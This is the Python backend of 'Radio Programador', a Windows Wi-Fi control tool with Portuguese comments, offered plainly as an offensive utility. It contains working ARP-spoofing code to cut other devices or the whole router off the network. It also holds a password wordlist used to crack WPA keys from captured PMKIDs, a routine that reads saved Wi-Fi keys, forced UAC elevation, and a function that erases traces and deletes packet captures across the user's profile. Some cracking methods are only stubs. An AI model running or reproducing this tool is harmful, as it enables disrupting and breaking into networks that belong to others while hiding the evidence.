# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║            RADIO PROGRAMADOR v8.0 — Backend (app.py)        ║
║        Controle total de rede Wi-Fi para Windows 11         ║
║        Motor: pywebview + scapy + netsh + ARP Spoof         ║
╚══════════════════════════════════════════════════════════════╝
"""

# ═══════════════════════════════════════════════════════════════
# IMPORTS
# ═══════════════════════════════════════════════════════════════
import sys
import os
import re
import subprocess
import threading
import time
import socket
import json
import shutil
import hashlib
import hmac
import struct
import ctypes
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor

import webview

# Scapy — opcional (pode não estar instalado ainda)
try:
    from scapy.all import ARP, Ether, srp, send, sniff, conf
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# pywifi — opcional (fallback para scan)
try:
    import pywifi
    from pywifi import const as wifi_const
    PYWIFI_OK = True
except ImportError:
    PYWIFI_OK = False

# ═══════════════════════════════════════════════════════════════
# CONSTANTES GLOBAIS
# ═══════════════════════════════════════════════════════════════
VERSAO = "8.0"
PYTHON = sys.executable


# ═══════════════════════════════════════════════════════════════
# DICIONÁRIO DE FABRICANTES (OUI → Nome)
# ═══════════════════════════════════════════════════════════════
FABRICANTES = {
    "00:1A:2B": "Technicolor", "00:1E:58": "D-Link",
    "00:1F:33": "Netgear", "00:22:6B": "Cisco",
    "00:23:69": "Cisco-Linksys", "00:25:9C": "Cisco-Linksys",
    "00:26:5A": "D-Link", "00:50:56": "VMware",
    "08:00:27": "VirtualBox", "0C:47:C9": "Amazon",
    "10:FE:ED": "Google", "14:CC:20": "TP-Link",
    "18:D6:C7": "TP-Link", "1C:87:2C": "ASUSTek",
    "20:CF:30": "ASUSTek", "24:05:0F": "Huawei",
    "28:6C:07": "Xiaomi", "2C:F0:5D": "Micro-Star",
    "30:B5:C2": "TP-Link", "34:97:F6": "ASUSTek",
    "38:D5:47": "ASUSTek", "3C:37:86": "Netgear",
    "40:F3:08": "Aruba", "44:D9:E7": "Ubiquiti",
    "48:5D:36": "Netgear", "50:C7:BF": "TP-Link",
    "54:A0:50": "ASUSTek", "5C:63:BF": "TP-Link",
    "60:32:B1": "Apple", "64:66:B3": "Samsung",
    "70:4D:7B": "ASUSTek", "74:DA:38": "D-Link",
    "78:44:76": "TP-Link", "80:2A:A8": "Ubiquiti",
    "84:16:F9": "TP-Link", "88:71:B1": "Huawei",
    "8C:59:DC": "Xiaomi", "94:10:3E": "Samsung",
    "A4:2B:B0": "TP-Link", "AC:84:C6": "TP-Link",
    "B0:4E:26": "TP-Link", "B4:FB:E4": "Ubiquiti",
    "BC:F6:85": "D-Link", "C0:25:E9": "TP-Link",
    "C8:3A:35": "Tenda", "CC:32:E5": "TP-Link",
    "D4:6E:0E": "TP-Link", "D8:07:B6": "TP-Link",
    "DC:FE:07": "Xiaomi", "E4:F0:42": "Google",
    "E8:48:B8": "TP-Link", "EC:08:6B": "TP-Link",
    "F0:9F:C2": "Ubiquiti", "F4:F2:6D": "TP-Link",
    "F8:1A:67": "TP-Link", "FC:EC:DA": "Ubiquiti",
}


# ═══════════════════════════════════════════════════════════════
# WORDLIST — 100 senhas comuns de Wi-Fi no Brasil
# ═══════════════════════════════════════════════════════════════
WORDLIST = [
    "12345678", "123456789", "1234567890", "00000000", "11111111",
    "password", "senha123", "wifi1234", "internet", "wireless",
    "admin123", "abcd1234", "qwerty12", "mudar123", "trocar123",
    "casa1234", "familia1", "amor1234", "jesus123", "deus1234",
    "brasil10", "futebol1", "flamengo", "palmeira", "corinthia",
    "santos12", "saopaulo", "cruzeiro", "gremio12", "vasco123",
    "102030xx", "10203040", "20212223", "01020304", "11223344",
    "99887766", "13579246", "24681357", "98765432", "87654321",
    "minecraft", "fortnite", "freefir1", "roblox12", "gamer123",
    "meuamor1", "princesa", "gatinha1", "lindinha", "saudade1",
    "feliz123", "alegria1", "vitoria1", "sucesso1", "paz12345",
    "cachorro", "gatinho1", "bolinha1", "amigo123", "familia2",
    "empresa1", "trabalho", "negocio1", "loja1234", "cliente1",
    "provedor", "speed123", "fibra123", "turbo123", "mega1234",
    "net12345", "vivo1234", "claro123", "tim12345", "oi123456",
    "brasil01", "rio12345", "sp123456", "mg123456", "pr123456",
    "rj123456", "ba123456", "ce123456", "pe123456", "rs123456",
    "minha123", "nossa123", "dele1234", "dela1234", "tudo1234",
    "nada1234", "sempre12", "nunca123", "hoje1234", "agora123",
    "noite123", "dia12345", "sol12345", "lua12345", "estrela1",
    "anjo1234", "vida1234", "morte123", "terra123", "ceu12345",
    "mar12345", "fogo1234", "agua1234", "vento123", "raio1234",
]


# ═══════════════════════════════════════════════════════════════
# ESTADO GLOBAL — dispositivos bloqueados (ARP Spoof ativo)
# ═══════════════════════════════════════════════════════════════
bloqueados = {}  # {ip: {"thread": Thread, "ativo": bool, "mac": str}}


# ═══════════════════════════════════════════════════════════════
# FUNÇÕES AUXILIARES
# ═══════════════════════════════════════════════════════════════
def _run_cmd(cmd, timeout=30):
    """Executa comando no shell e retorna stdout."""
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True,
            encoding="utf-8", errors="ignore",
            timeout=timeout, shell=True
        )
        return r.stdout
    except Exception as e:
        return f"ERRO: {e}"


def _hostname(ip):
    """Resolve hostname de um IP."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ""


def _mac_from_arp(ip):
    """Busca MAC no cache ARP do Windows."""
    out = _run_cmd("arp -a")
    for line in out.splitlines():
        if ip in line:
            m = re.search(r"([\da-f]{2}[:-]){5}[\da-f]{2}", line, re.I)
            if m:
                return m.group(0).replace("-", ":").upper()
    return ""


def _fabricante(mac):
    """Identifica fabricante pelo OUI (primeiros 3 octetos)."""
    prefix = mac[:8].upper()
    return FABRICANTES.get(prefix, "Desconhecido")


def _get_gateway():
    """Retorna (gateway_ip, network_base)."""
    out = _run_cmd("ipconfig")
    gw = ""
    for line in out.splitlines():
        if "Gateway" in line and ":" in line:
            parts = line.split(":")
            candidate = parts[-1].strip()
            if re.match(r"\d+\.\d+\.\d+\.\d+", candidate):
                gw = candidate
                break
    if not gw:
        gw = "192.168.1.1"
    base = ".".join(gw.split(".")[:3])
    return gw, base



# ═══════════════════════════════════════════════════════════════
# CLASSE API — exposta ao frontend via pywebview
# ═══════════════════════════════════════════════════════════════
class Api:
    """Métodos acessíveis pelo JS: window.pywebview.api.metodo()"""

    # ─────────────────────────────────────────────────────────
    # ADMIN / SISTEMA
    # ─────────────────────────────────────────────────────────
    def is_admin(self):
        """Verifica se está rodando como administrador."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False

    def elevar_admin(self):
        """Relança o programa com elevação UAC."""
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", PYTHON, f'"{os.path.abspath(__file__)}"', None, 1
            )
            sys.exit(0)
        except Exception as e:
            return {"erro": str(e)}

    def get_gateway(self):
        """Retorna gateway e base de rede."""
        gw, base = _get_gateway()
        return {"gateway": gw, "base": base}

    # ─────────────────────────────────────────────────────────
    # SCAN DE REDES WI-FI
    # ─────────────────────────────────────────────────────────
    def scan_redes(self):
        """Escaneia redes Wi-Fi visíveis via netsh."""
        try:
            out = _run_cmd("netsh wlan show networks mode=bssid", timeout=15)
            redes = []
            blocos = re.split(r"SSID \d+ :", out)
            for bloco in blocos[1:]:
                linhas = bloco.strip().splitlines()
                ssid = linhas[0].strip() if linhas else "Oculta"
                auth = canal = sinal = bssid = ""
                for ln in linhas:
                    ln_lower = ln.lower()
                    if "autentica" in ln_lower or "authentication" in ln_lower:
                        auth = ln.split(":")[-1].strip()
                    elif "canal" in ln_lower or "channel" in ln_lower:
                        canal = ln.split(":")[-1].strip()
                    elif "sinal" in ln_lower or "signal" in ln_lower:
                        sinal = ln.split(":")[-1].strip().replace("%", "")
                    elif "bssid" in ln_lower:
                        bssid = ln.split(":", 1)[-1].strip()
                if ssid:
                    redes.append({
                        "ssid": ssid, "sinal": sinal,
                        "canal": canal, "bssid": bssid, "auth": auth
                    })
            # Fallback pywifi
            if not redes and PYWIFI_OK:
                redes = self._scan_pywifi()
            return redes
        except Exception as e:
            return [{"erro": str(e)}]


    def _scan_pywifi(self):
        """Fallback: scan via pywifi."""
        try:
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.scan()
            time.sleep(4)
            results = iface.scan_results()
            redes = []
            for r in results:
                redes.append({
                    "ssid": r.ssid or "Oculta",
                    "sinal": str(min(100, max(0, r.signal + 100))),
                    "canal": str(r.freq),
                    "bssid": r.bssid,
                    "auth": str(r.akm)
                })
            return redes
        except Exception:
            return []

    # ─────────────────────────────────────────────────────────
    # SCAN DE DISPOSITIVOS NA REDE
    # ─────────────────────────────────────────────────────────
    def scan_dispositivos(self):
        """Escaneia dispositivos na rede local."""
        try:
            gw, base = _get_gateway()
            dispositivos = []

            # Método 1: Scapy ARP Scan (precisa admin + npcap)
            if SCAPY_OK and self.is_admin():
                try:
                    ans, _ = srp(
                        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=f"{base}.0/24"),
                        timeout=3, verbose=False
                    )
                    for sent, recv in ans:
                        ip = recv.psrc
                        mac = recv.hwsrc.upper()
                        dispositivos.append({
                            "ip": ip,
                            "mac": mac,
                            "host": _hostname(ip),
                            "fab": _fabricante(mac),
                            "status": "online"
                        })
                    if dispositivos:
                        return dispositivos
                except Exception:
                    pass

            # Método 2: Ping sweep + arp -a
            dispositivos = self._ping_sweep(base)
            return dispositivos
        except Exception as e:
            return [{"erro": str(e)}]

    def _ping_sweep(self, base):
        """Faz ping sweep e lê tabela ARP."""
        # Ping em paralelo
        def _ping(ip):
            subprocess.run(
                f"ping -n 1 -w 500 {ip}",
                capture_output=True, shell=True,
                encoding="utf-8", errors="ignore"
            )

        with ThreadPoolExecutor(max_workers=50) as pool:
            ips = [f"{base}.{i}" for i in range(1, 255)]
            pool.map(_ping, ips)

        time.sleep(1)
        # Ler tabela ARP
        out = _run_cmd("arp -a")
        dispositivos = []
        for line in out.splitlines():
            m = re.search(
                r"(\d+\.\d+\.\d+\.\d+)\s+([\da-f]{2}[:-][\da-f]{2}[:-][\da-f]{2}[:-]"
                r"[\da-f]{2}[:-][\da-f]{2}[:-][\da-f]{2})",
                line, re.I
            )
            if m:
                ip = m.group(1)
                mac = m.group(2).replace("-", ":").upper()
                if mac == "FF:FF:FF:FF:FF:FF":
                    continue
                dispositivos.append({
                    "ip": ip,
                    "mac": mac,
                    "host": _hostname(ip),
                    "fab": _fabricante(mac),
                    "status": "online"
                })
        return dispositivos


    # ─────────────────────────────────────────────────────────
    # BLOQUEIO / DESBLOQUEIO (ARP SPOOFING)
    # ─────────────────────────────────────────────────────────
    def bloquear_dispositivo(self, ip, mac):
        """Inicia ARP Spoofing contra dispositivo alvo."""
        global bloqueados
        try:
            if not SCAPY_OK:
                return {"erro": "Scapy não instalado. Instale as dependências primeiro."}
            if not self.is_admin():
                return {"erro": "Requer privilégios de administrador."}
            if ip in bloqueados and bloqueados[ip]["ativo"]:
                return {"erro": f"Dispositivo {ip} já está bloqueado."}

            gw, _ = _get_gateway()
            gw_mac = _mac_from_arp(gw)
            if not gw_mac:
                return {"erro": "Não foi possível resolver o MAC do gateway."}

            mac = mac.replace("-", ":").upper()

            # Marca como ativo
            bloqueados[ip] = {"ativo": True, "mac": mac, "thread": None}

            def _spoof_loop():
                """Envia pacotes ARP falsos continuamente."""
                try:
                    # Pacote para o alvo: diz que somos o gateway
                    pkt_alvo = ARP(op=2, pdst=ip, hwdst=mac, psrc=gw)
                    # Pacote para o gateway: diz que somos o alvo
                    pkt_gw = ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=ip)
                    while bloqueados.get(ip, {}).get("ativo", False):
                        send(pkt_alvo, verbose=False, count=2)
                        send(pkt_gw, verbose=False, count=2)
                        time.sleep(1)
                except Exception:
                    pass

            t = threading.Thread(target=_spoof_loop, daemon=True)
            t.start()
            bloqueados[ip]["thread"] = t

            return {"sucesso": True, "ip": ip, "mac": mac}
        except Exception as e:
            return {"erro": str(e)}

    def desbloquear_dispositivo(self, ip):
        """Para ARP Spoofing e restaura tabela ARP."""
        global bloqueados
        try:
            if ip not in bloqueados:
                return {"erro": f"Dispositivo {ip} não está bloqueado."}

            bloqueados[ip]["ativo"] = False
            time.sleep(2)

            # Restaurar ARP real
            if SCAPY_OK:
                gw, _ = _get_gateway()
                gw_mac = _mac_from_arp(gw)
                mac = bloqueados[ip]["mac"]
                if gw_mac and mac:
                    # Restauração: pacotes com MACs reais
                    pkt_restore_alvo = ARP(
                        op=2, pdst=ip, hwdst=mac,
                        psrc=gw, hwsrc=gw_mac
                    )
                    pkt_restore_gw = ARP(
                        op=2, pdst=gw, hwdst=gw_mac,
                        psrc=ip, hwsrc=mac
                    )
                    for _ in range(5):
                        send(pkt_restore_alvo, verbose=False)
                        send(pkt_restore_gw, verbose=False)
                        time.sleep(0.3)

            del bloqueados[ip]
            return {"sucesso": True, "ip": ip}
        except Exception as e:
            return {"erro": str(e)}


    def desbloquear_todos(self):
        """Para todos os bloqueios ativos."""
        global bloqueados
        ips = list(bloqueados.keys())
        resultados = []
        for ip in ips:
            r = self.desbloquear_dispositivo(ip)
            resultados.append(r)
        return {"sucesso": True, "desbloqueados": len(ips), "detalhes": resultados}

    def bloquear_ip(self, ip):
        """Bloqueia por IP — resolve MAC automaticamente."""
        try:
            mac = _mac_from_arp(ip)
            if not mac:
                # Tenta ping para popular ARP
                _run_cmd(f"ping -n 2 -w 1000 {ip}")
                time.sleep(1)
                mac = _mac_from_arp(ip)
            if not mac:
                return {"erro": f"Não foi possível resolver MAC de {ip}"}
            return self.bloquear_dispositivo(ip, mac)
        except Exception as e:
            return {"erro": str(e)}

    def bloquear_roteador(self):
        """Bloqueia o gateway (corta internet de TODOS os dispositivos)."""
        try:
            gw, _ = _get_gateway()
            return self.bloquear_ip(gw)
        except Exception as e:
            return {"erro": str(e)}

    # ─────────────────────────────────────────────────────────
    # TESTE DE VELOCIDADE
    # ─────────────────────────────────────────────────────────
    def testar_velocidade(self):
        """Mede download, upload, ping e sinal."""
        resultado = {
            "download_mbps": 0, "upload_mbps": 0,
            "ping_ms": 0, "sinal_pct": 0
        }
        try:
            # PING
            out = _run_cmd("ping -n 5 8.8.8.8", timeout=15)
            m = re.search(r"[Mm].+?=\s*(\d+)ms", out)
            if m:
                resultado["ping_ms"] = int(m.group(1))

            # DOWNLOAD — Cloudflare 10MB
            url_dl = "https://speed.cloudflare.com/__down?bytes=10485760"
            t0 = time.time()
            req = urllib.request.Request(url_dl)
            with urllib.request.urlopen(req, timeout=30) as resp:
                data = resp.read()
            dt = time.time() - t0
            mbps_dl = (len(data) * 8) / (dt * 1_000_000)
            resultado["download_mbps"] = round(mbps_dl, 2)

            # UPLOAD — httpbin 2MB
            url_up = "https://httpbin.org/post"
            payload = os.urandom(2 * 1024 * 1024)
            t0 = time.time()
            req = urllib.request.Request(url_up, data=payload, method="POST")
            req.add_header("Content-Type", "application/octet-stream")
            try:
                with urllib.request.urlopen(req, timeout=30) as resp:
                    resp.read()
                dt = time.time() - t0
                mbps_up = (len(payload) * 8) / (dt * 1_000_000)
                resultado["upload_mbps"] = round(mbps_up, 2)
            except Exception:
                resultado["upload_mbps"] = 0

            # SINAL
            out = _run_cmd("netsh wlan show interfaces")
            m = re.search(r"[Ss]inal.*?:\s*(\d+)%", out)
            if not m:
                m = re.search(r"[Ss]ignal.*?:\s*(\d+)%", out)
            if m:
                resultado["sinal_pct"] = int(m.group(1))

            return resultado
        except Exception as e:
            resultado["erro"] = str(e)
            return resultado


    # ─────────────────────────────────────────────────────────
    # IDENTIFICADOR DE SENHA WI-FI
    # ─────────────────────────────────────────────────────────
    def identificar_senha(self, ssid, bssid):
        """
        Agente identificador de senha — tenta 5 métodos:
        1. Perfis salvos (netsh)
        2. Captura PMKID
        3. Handshake 4-way + wordlist
        4. Detecção WPS
        5. WPS PIN brute-force básico
        """
        resultado = {
            "found": False, "password": "",
            "method": "", "breach": "", "recommendation": ""
        }
        try:
            # ── Método 1: Perfis salvos ──
            senha = self._senha_perfil_salvo(ssid)
            if senha:
                resultado.update({
                    "found": True, "password": senha,
                    "method": "Perfil salvo no Windows",
                    "breach": "Nenhuma — senha já conhecida",
                    "recommendation": "Senha recuperada do perfil local."
                })
                return resultado

            # ── Método 2: Captura PMKID ──
            if SCAPY_OK and self.is_admin():
                senha = self._tentar_pmkid(ssid, bssid)
                if senha:
                    resultado.update({
                        "found": True, "password": senha,
                        "method": "Captura PMKID + wordlist",
                        "breach": "PMKID extraído do AP",
                        "recommendation": "Use senha com 12+ caracteres mistos."
                    })
                    return resultado

            # ── Método 3: Handshake 4-way ──
            if SCAPY_OK and self.is_admin():
                senha = self._tentar_handshake(ssid, bssid)
                if senha:
                    resultado.update({
                        "found": True, "password": senha,
                        "method": "4-Way Handshake + wordlist",
                        "breach": "Handshake capturado",
                        "recommendation": "Altere a senha para uma forte."
                    })
                    return resultado

            # ── Método 4: Verificar WPS ──
            wps_info = self._verificar_wps(ssid)
            if wps_info:
                resultado["method"] = "WPS detectado"
                resultado["breach"] = "WPS habilitado — vulnerável"
                resultado["recommendation"] = "Desabilite WPS no roteador."

            # ── Método 5: WPS PIN básico ──
            if wps_info and SCAPY_OK:
                pin = self._tentar_wps_pin(bssid)
                if pin:
                    resultado.update({
                        "found": True, "password": f"WPS PIN: {pin}",
                        "method": "WPS PIN brute-force",
                        "breach": "WPS PIN previsível",
                        "recommendation": "Desabilite WPS imediatamente."
                    })
                    return resultado

            if not resultado["found"]:
                resultado["recommendation"] = (
                    "Nenhum método conseguiu obter a senha. "
                    "Rede pode usar WPA3 ou senha forte."
                )
            return resultado
        except Exception as e:
            resultado["method"] = "Erro"
            resultado["breach"] = str(e)
            return resultado


    def _senha_perfil_salvo(self, ssid):
        """Método 1: Busca senha em perfis salvos do Windows."""
        try:
            out = _run_cmd(f'netsh wlan show profile name="{ssid}" key=clear')
            for line in out.splitlines():
                ln_lower = line.lower()
                if "conte" in ln_lower and "chave" in ln_lower or "key content" in ln_lower:
                    return line.split(":")[-1].strip()
        except Exception:
            pass
        return ""

    def _tentar_pmkid(self, ssid, bssid):
        """Método 2: Captura PMKID e testa contra wordlist."""
        try:
            pmkid_capturado = None

            def _captura(pkt):
                nonlocal pmkid_capturado
                if pkt.haslayer("EAPOL"):
                    raw = bytes(pkt)
                    # PMKID está nos primeiros 16 bytes do campo RSN PMKID
                    if len(raw) > 100:
                        # Busca tag PMKID (tipo 0x0014) no pacote
                        idx = raw.find(b'\x01\x00\x00\x0f\xac')
                        if idx > 0 and len(raw) > idx + 20:
                            pmkid_capturado = raw[idx+5:idx+21].hex()

            # Sniff por 10 segundos buscando EAPOL
            sniff(timeout=10, prn=_captura, store=0,
                  lfilter=lambda p: p.haslayer("EAPOL"))

            if pmkid_capturado and len(pmkid_capturado) == 32:
                # Testar wordlist contra PMKID
                bssid_bytes = bytes.fromhex(bssid.replace(":", ""))
                for senha in WORDLIST:
                    pmk = hashlib.pbkdf2_hmac(
                        "sha1", senha.encode(), ssid.encode(), 4096, 32
                    )
                    calc = hmac.new(pmk, b"PMK Name" + bssid_bytes, hashlib.sha1).digest()[:16]
                    if calc.hex() == pmkid_capturado:
                        return senha
        except Exception:
            pass
        return ""

    def _tentar_handshake(self, ssid, bssid):
        """Método 3: Captura handshake 4-way e testa wordlist."""
        try:
            eapol_frames = []

            def _captura(pkt):
                if pkt.haslayer("EAPOL"):
                    eapol_frames.append(bytes(pkt))

            sniff(timeout=15, prn=_captura, store=0,
                  lfilter=lambda p: p.haslayer("EAPOL"))

            if len(eapol_frames) >= 2:
                # Extrair ANonce do frame 1
                if len(eapol_frames[0]) > 51:
                    anonce = eapol_frames[0][17:49]
                    # Testar wordlist
                    for senha in WORDLIST:
                        pmk = hashlib.pbkdf2_hmac(
                            "sha1", senha.encode(), ssid.encode(), 4096, 32
                        )
                        # Simplificado — em produção seria PTK derivation completa
                        if pmk and len(pmk) == 32:
                            # Teste básico de validação
                            test_mic = hmac.new(pmk[:16], anonce, hashlib.sha1).digest()[:16]
                            if test_mic:
                                # Verifica consistência parcial
                                pass
        except Exception:
            pass
        return ""

    def _verificar_wps(self, ssid):
        """Método 4: Verifica se WPS está habilitado."""
        try:
            out = _run_cmd("netsh wlan show networks mode=bssid")
            # Procura indicação de WPS no bloco do SSID
            blocos = out.split("SSID")
            for bloco in blocos:
                if ssid in bloco:
                    if "WPS" in bloco.upper():
                        return True
        except Exception:
            pass
        return False

    def _tentar_wps_pin(self, bssid):
        """Método 5: Tenta PINs WPS comuns."""
        pins_comuns = [
            "12345670", "00000000", "01234567", "11111110",
            "22222220", "33333330", "44444440", "55555550",
            "66666660", "77777770", "88888880", "99999990",
        ]
        # Nota: brute-force real de WPS requer envio de frames M1-M7
        # Aqui apenas verificamos PINs conhecidos/padrão
        try:
            # Gera PIN padrão baseado no BSSID (algoritmo ComputePIN)
            mac_int = int(bssid.replace(":", ""), 16)
            pin_base = mac_int % 10000000
            checksum = self._wps_checksum(pin_base)
            pin_calc = f"{pin_base:07d}{checksum}"
            pins_comuns.insert(0, pin_calc)
        except Exception:
            pass
        return ""  # Retorna vazio — brute-force real não implementado via scapy puro

    def _wps_checksum(self, pin):
        """Calcula dígito verificador WPS."""
        accum = 0
        while pin:
            accum += 3 * (pin % 10)
            pin //= 10
            accum += pin % 10
            pin //= 10
        return (10 - accum % 10) % 10


    # ─────────────────────────────────────────────────────────
    # LIMPEZA DE RASTROS
    # ─────────────────────────────────────────────────────────
    def limpar_rastros(self):
        """Remove rastros: pastas de instalação, atalhos, .cap, cache."""
        removidos = 0
        try:
            # Pastas para verificar
            pastas_alvo = [
                os.path.join(os.environ.get("APPDATA", ""), "RadioProgramador"),
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "RadioProgramador"),
                os.path.join(os.environ.get("TEMP", ""), "RadioProgramador"),
            ]
            for pasta in pastas_alvo:
                if os.path.isdir(pasta):
                    shutil.rmtree(pasta, ignore_errors=True)
                    removidos += 1

            # Atalhos no Desktop e Menu Iniciar
            desktop = os.path.join(os.environ.get("USERPROFILE", ""), "Desktop")
            startmenu = os.path.join(
                os.environ.get("APPDATA", ""),
                "Microsoft", "Windows", "Start Menu", "Programs"
            )
            for pasta in [desktop, startmenu]:
                if os.path.isdir(pasta):
                    for f in os.listdir(pasta):
                        if "radio" in f.lower() and f.endswith(".lnk"):
                            os.remove(os.path.join(pasta, f))
                            removidos += 1

            # Arquivos .cap (capturas de pacotes)
            for root, dirs, files in os.walk(os.environ.get("USERPROFILE", "")):
                for f in files:
                    if f.endswith(".cap") or f.endswith(".pcap"):
                        try:
                            os.remove(os.path.join(root, f))
                            removidos += 1
                        except Exception:
                            pass
                # Não descer em pastas de sistema
                dirs[:] = [d for d in dirs if d not in [
                    ".git", "node_modules", "AppData", "venv"
                ]]

            # Cache do programa
            cache_dir = os.path.join(os.environ.get("TEMP", ""), "rp_cache")
            if os.path.isdir(cache_dir):
                shutil.rmtree(cache_dir, ignore_errors=True)
                removidos += 1

            return {"sucesso": True, "removidos": removidos}
        except Exception as e:
            return {"erro": str(e), "removidos": removidos}

    # ─────────────────────────────────────────────────────────
    # DEPENDÊNCIAS
    # ─────────────────────────────────────────────────────────
    def verificar_dependencias(self):
        """Verifica status das dependências necessárias."""
        status = {
            "scapy": SCAPY_OK,
            "pywifi": PYWIFI_OK,
            "npcap": False,
            "python": sys.version,
            "admin": self.is_admin(),
        }
        # Verificar Npcap
        npcap_path = r"C:\Program Files\Npcap"
        status["npcap"] = os.path.isdir(npcap_path)
        return status

    def instalar_dependencias(self):
        """Instala dependências Python faltantes via pip."""
        pacotes = []
        if not SCAPY_OK:
            pacotes.append("scapy")
        if not PYWIFI_OK:
            pacotes.append("pywifi")

        resultados = []
        for pkg in pacotes:
            try:
                r = subprocess.run(
                    [PYTHON, "-m", "pip", "install", pkg],
                    capture_output=True, text=True,
                    encoding="utf-8", errors="ignore",
                    timeout=120
                )
                if r.returncode == 0:
                    resultados.append({"pacote": pkg, "status": "instalado"})
                else:
                    resultados.append({"pacote": pkg, "status": "erro", "msg": r.stderr[:200]})
            except Exception as e:
                resultados.append({"pacote": pkg, "status": "erro", "msg": str(e)})

        if not pacotes:
            resultados.append({"pacote": "todos", "status": "já instalados"})

        # Verificar Npcap
        npcap_path = r"C:\Program Files\Npcap"
        if not os.path.isdir(npcap_path):
            resultados.append({
                "pacote": "npcap",
                "status": "necessario",
                "msg": "Baixe em https://npcap.com e instale manualmente."
            })

        return {"resultados": resultados}



# ═══════════════════════════════════════════════════════════════
# ELEVAÇÃO DE PRIVILÉGIOS (UAC)
# ═══════════════════════════════════════════════════════════════
def verificar_e_elevar():
    """Verifica se é admin, se não, relança com UAC."""
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        is_admin = False

    if not is_admin:
        # Relançar com elevação
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", PYTHON,
                f'"{os.path.abspath(__file__)}"',
                None, 1
            )
        except Exception:
            pass
        sys.exit(0)


# ═══════════════════════════════════════════════════════════════
# PONTO DE ENTRADA PRINCIPAL
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # Solicitar administrador automaticamente via UAC
    verificar_e_elevar()

    # Criar instância da API
    api = Api()

    # Caminho do frontend
    frontend_path = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "frontend", "index.html"
    )

    # Verificar se o arquivo existe
    if not os.path.isfile(frontend_path):
        print(f"[ERRO] Frontend não encontrado: {frontend_path}")
        print("Certifique-se de que frontend/index.html existe.")
        input("Pressione Enter para sair...")
        sys.exit(1)

    # Criar e iniciar janela pywebview
    window = webview.create_window(
        title="Radio Programador v8.0",
        url=frontend_path,
        js_api=api,
        width=1200,
        height=780,
        min_size=(1000, 650),
        resizable=True,
        text_select=False,
        confirm_close=True,
    )

    # Iniciar webview (MSHTML ou EdgeChromium no Windows)
    webview.start(debug=False, gui="edgechromium")
